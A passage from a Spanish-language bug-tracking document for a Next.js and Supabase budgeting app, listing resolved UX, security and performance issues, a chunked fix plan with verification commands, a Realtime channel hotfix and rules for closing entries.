- **Notas**: Resuelto en workspace el 2026-05-20: `ActivityToasts` expone `role="status"`, `aria-live="polite"` y `aria-atomic="false"`. Cubierto por `components/shared/ActivityToasts.test.tsx`.

### UX-07: `isSubmitting` no propagado uniformemente

- **Estado**: [x] Resuelto
- **Archivo**: `components/recursos/ResourceFormPanel.tsx`
- **Descripción**: Deshabilita botones pero no inputs, a diferencia de `ProviderFormPanel` que sí los deshabilita.
- **Solución propuesta**: Propagar `disabled={isSubmitting}` a todos los inputs de cada form para comportamiento consistente.
- **Notas**: Resuelto en workspace el 2026-05-21: `ResourceFormPanel` y `PartidaFormPanel` deshabilitan todos los campos durante `isSubmitting`; el transporte conserva ademas su bloqueo cuando no aplica.

### UX-08: Topbar llama `createBrowserClient()` dos veces y permite doble signOut

- **Estado**: [x] Resuelto
- **Archivo**: `components/layout/Topbar.tsx:22,46`
- **Descripción**: Cliente Supabase creado dos veces. `handleSignOut` se redefine cada render y el botón no se deshabilita durante la salida.
- **Solución propuesta**: `useCallback` para el handler + estado `isSigningOut` que deshabilite el botón.
- **Notas**: Resuelto en workspace el 2026-05-21: `Topbar` reutiliza el singleton, estabiliza `handleSignOut` con `useCallback`, marca `isSigningOut` y deshabilita doble click.

### UX-09: Middleware matcher con patrón débil

- **Estado**: [x] Resuelto
- **Archivo**: `middleware.ts:84-86`
- **Descripción**: Excluye paths con extensiones de imagen anywhere en URL. Una ruta dinámica `/proyectos/foo.png` bypassea el middleware.
- **Solución propuesta**: Usar approach allowlist más estricto. Restringir a paths conocidos en `_next/static`, `_next/image` y `/public`.
- **Notas**: Resuelto en workspace el 2026-05-20: `middleware.ts` usa matcher allowlist de rutas reales/protegidas en vez de excluir por extensión de imagen en cualquier parte del path. Verificado con `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

---

## Orden sugerido de resolución por chunks

Estos chunks agrupan entradas por dependencia técnica y tipo de verificación. La idea es resolver primero lo que protege datos/cálculos, luego seguridad productiva, y dejar refactors amplios para cuando los contratos críticos estén estables.

### Chunk 1: Cálculos financieros y validaciones base

Objetivo: corregir fórmulas, redondeo y validaciones que pueden cambiar montos o datos persistidos.

- `COR-01`, `COR-02`, `COR-06`, `COR-07`, `COR-08`, `COR-09`, `COR-10`, `COR-11`, `COR-12`, `COR-13`, `COR-18`, `COR-19`, `COR-20`.
- Decisiones relacionadas antes o durante el chunk: `COR-15`, `COR-17`.
- Verificación mínima: `pnpm test`, `pnpm lint`, `pnpm build`; agregar o ajustar tests en `lib/calculations/`, `lib/validations/` y `lib/exports/` si cambia la salida.
- Documentación esperada: `docs/03-calculos.md`, `docs/06-validaciones-y-testing.md`, `docs/07-exportaciones.md` si cambia exportación.

### Chunk 2: Integridad de presupuestos y transacciones

Objetivo: proteger emisión de versiones oficiales, concurrencia y auditoría de cambios críticos.

- `ARC-01`, `ARC-04`, `ARC-05`, `ARC-06`, `ARC-08`, `COR-16`, `SEG-03`, `SEG-04`, `SEG-11`, `SEG-12`, `SEG-20`, `SEG-22`.
- Resolver preferentemente con migraciones/RPCs transaccionales antes de optimizar UI.
- Verificación mínima: `pnpm run supabase:reset`, `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm lint`, `pnpm build`.
- Documentación esperada: `docs/01-arquitectura.md`, `docs/02-modelo-datos.md`, `docs/08-produccion.md`.

### Chunk 3: Seguridad de auth, rutas y producción web

Objetivo: cerrar riesgos directos de deploy remoto y endurecer configuración antes de Vercel/Supabase remoto.

- `SEG-01`, `SEG-02`, `SEG-05`, `SEG-07`, `SEG-08`, `SEG-09`, `SEG-13`, `SEG-14`, `SEG-15`, `SEG-17`, `SEG-18`, `SEG-19`, `UX-09`.
- Puede dividirse en subchunk frontend/config y subchunk SQL si se quiere reducir riesgo.
- Verificación mínima: `pnpm lint`, `pnpm test`, `pnpm build`; para cambios SQL, sumar reset/types/pgTAP.
- Documentación esperada: `docs/08-produccion.md` y `AGENTS.md` si cambian variables o comandos.

### Chunk 4: Realtime, Presence y colaboración

Objetivo: estabilizar canales privados, evitar refetch propio y mejorar sesiones largas.

- `SEG-06`, `PER-01`, `SEG-16`, `SEG-23`, `UX-05`, `UX-06`.
- Estado: cerrado en workspace el 2026-05-20 con migración `20260520171946_chunk4_realtime_presence_collaboration.sql`, tests realtime, pgTAP, types, tsc, lint y build.
- Verificación mínima: tests de `lib/realtime/`, `pnpm lint`, `pnpm test`, `pnpm build`; si hay migración de realtime, sumar pgTAP.
- Documentación esperada: `docs/01-arquitectura.md`, `docs/05-frontend-ui-ux.md`, `docs/08-produccion.md`.

### Chunk 5: Performance y reducción de queries

Objetivo: bajar waterfalls, N+1 y trabajo repetido sin cambiar contratos de negocio.

- `ARC-02`, `ARC-03`, `ARC-07`, `ARC-09`, `ARC-10`, `ARC-11`, `ARC-12`, `ARC-13`, `ARC-14`, `ARC-15`, `ARC-18`, `PER-02`, `PER-03`, `PER-04`, `UX-08`.
- Estado: cerrado en workspace el 2026-05-21 con migración `20260521143659_chunk5_performance_query_reduction.sql`, RPCs set-based de refresco/recalculo/dashboard, singleton Supabase browser, resolver workspace compartido, wrappers Server Component y memoización de tablas/cronogramas/presupuestos.
- Hacer después de los chunks 1 y 2 para no optimizar código que puede moverse a RPC.
- Verificación mínima: `pnpm test`, `pnpm lint`, `pnpm build`; agregar pruebas de repositorios cuando se cambien queries.
- Documentación esperada: `docs/01-arquitectura.md` si se introduce contexto/workspace compartido o Server Components.

### Chunk 6: Accesibilidad y consistencia UI

Objetivo: mejorar navegación por teclado, lectores de pantalla y estados de formularios sin tocar lógica financiera.

- `UX-01`, `UX-02`, `UX-03`, `UX-04`, `UX-07`.
- Estado: cerrado en workspace el 2026-05-21 con modales accesibles, headers de tablas con scope, filtros/seleccion persistidos en URL y formularios con `id/htmlFor` + campos bloqueados durante guardado.
- Verificación mínima: `pnpm lint`, `pnpm build`; si se tocan componentes compartidos, considerar prueba manual en navegador.
- Documentación esperada: `docs/05-frontend-ui-ux.md`.

### Chunk 7: Refactor y hardening preventivo

Objetivo: limpiar deuda técnica que conviene atacar después de estabilizar cálculos, seguridad y persistencia.

- `ARC-16`, `ARC-17`, `SEG-10`, `SEG-21`, `SEG-24`.
- Estado: cerrado en workspace el 2026-05-21 con refactor compatible de presupuestos/repositorio, sanitizacion de errores Supabase, hardening de HTML imprimible y migracion preventiva de onboarding RPC.
- Verificación mínima: `pnpm test`, `pnpm lint`, `pnpm build`.
- Documentación esperada: actualizar solo si cambia arquitectura o contratos visibles.

### Chunk 8: Cierre de verificación y pendientes pre-deploy

Objetivo: cerrar los fixes parciales detectados en la verificación post chunks 1-7 y los problemas nuevos introducidos por esos fixes. Debe completarse (los grupos 8a y 8b) o documentarse (el grupo 8c) antes de habilitar Vercel + Supabase remoto.

Estado: completado en workspace el 2026-05-21. Resultado de cierre: los grupos 8a y 8b quedaron implementados; 8c queda como checklist remoto documentado para el día del deploy productivo.

#### 8a — Fixes reales pequeños

Bugs concretos del código corregidos en Chunk 8. Cambios contenidos, sin impacto arquitectural.

- `COR-16` — tests agregados para `selectDraftResourceClientQuote` y `overrideDraftClientPrice` en `lib/data/budgets.test.ts`.
- `SEG-25` — migración nueva revoca grants amplios de sequences para clientes.
- `SEG-27` — perfiles no verificados usan placeholder seguro y Presence no expone nombre/email no verificado.
- `ARC-19` — bloque duplicado eliminado en `useActivitySubscription`.
- `UX-10` — `Topbar` reutiliza una única referencia a `createBrowserClient()`.

Verificación ejecutada: `pnpm run supabase:reset`, `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

#### 8b — Performance y refactor útiles

Mejoras válidas de performance/arquitectura cerradas en Chunk 8.

- `PER-02` — `BudgetTable` usa fila memoizada y callbacks estables.
- `ARC-09` — `recalculate_budget_draft_totals` devuelve bundle actualizado y evita re-fetch completo en el camino normal.
- `ARC-10` + `ARC-18` — el resolver de workspace cachea resultados por cliente singleton en browser e invalida fallos.
- `ARC-16` — retries de conflicto en presupuestos consolidados en helpers genéricos para bundle y emisión oficial.

Verificación ejecutada: `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint`, `pnpm build` y smoke con navegador sobre rutas protegidas.

#### 8c — Checklist remoto pre-deploy

No son bugs del código. Son pasos de configuración que solo se ejecutan al momento de tener Supabase remoto y dominio Vercel definitivos. Deben quedar documentados en `docs/08-produccion.md` antes del deploy, pero no requieren cambios en el repo hoy.

- `SEG-13` — activar CAPTCHA (`hcaptcha` o `turnstile`) en el dashboard remoto de Supabase para signup público. Considerar también ampliar a `lower_upper_letters_digits_symbols`. El fix local quedó completo.
- `SEG-26` — agregar la URL pública de Vercel a `additional_redirect_urls` y `Site URL` en el dashboard remoto de Supabase. Sin URL definitiva no se puede codificar; sí debe quedar como checklist.

Verificación al cerrar el chunk: `pnpm run supabase:reset`, `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint`, `pnpm build` y smoke con navegador.

Documentación actualizada: `docs/11-bugs-y-optimizaciones.md`, `docs/09-avances-y-goals.md`, `docs/01-arquitectura.md` y `docs/06-validaciones-y-testing.md`. `docs/08-produccion.md` ya contiene el checklist remoto de `SEG-13` y `SEG-26`.

---

### Hotfix post Chunk 8: colisión de canales Broadcast/Presence

- **Estado**: [x] Resuelto el 2026-05-21
- **Archivo**: `lib/realtime/presence.ts`, `lib/realtime/usePresenceChannel.ts`, `supabase/migrations/20260521172537_presence_dedicated_topics.sql`
- **Descripción**: tras convertir `createBrowserClient()` en singleton, Broadcast y Presence compartían cliente y topic (`project:{id}` / `org:{id}`). Supabase Realtime devuelve el canal existente si el topic ya está suscrito, por lo que `usePresenceChannel` intentaba agregar callbacks `presence` después de `subscribe()`.
- **Solución**: Presence usa topics dedicados (`presence:project:{id}`, `presence:org:{id}`) con RLS explícita y compatibilidad temporal para topics legacy. Los tests pgTAP validan suscripción/publicación en topics dedicados.
- **Verificación**: `pnpm run supabase:reset`, `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, tests unitarios de Realtime y TypeScript.

---

## Reglas de cierre

- Cuando un bug se resuelve, cambiar `[ ]` por `[x]` y completar **Notas** con: commit/PR, comandos de verificación ejecutados (`pnpm lint`, `pnpm test`, `pnpm build`), migración aplicada si corresponde y fecha.
- Si un bug se descubre durante el desarrollo de otro, agregarlo aquí con el siguiente número correlativo de su categoría.
- Si se decide no resolver un bug (ej. comportamiento intencional o post-MVP), cambiar el estado a `[~]` y dejar la justificación en **Notas**.
- Actualizar el **Resumen por severidad** al final de cada cierre.
- Para bugs de seguridad resueltos vía migración, agregar la migración en `supabase/migrations/` con timestamp posterior al de la migración original.

## Relación con otros documentos

- Si la corrección cambia arquitectura/cálculos/validaciones, actualizar también el documento correspondiente en `docs/`.
- Si la corrección afecta el roadmap, sincronizar con `docs/09-avances-y-goals.md`.
- Si la corrección es post-MVP y se decide diferir, mover a `docs/10-post-mvp-goals.md` con la justificación.
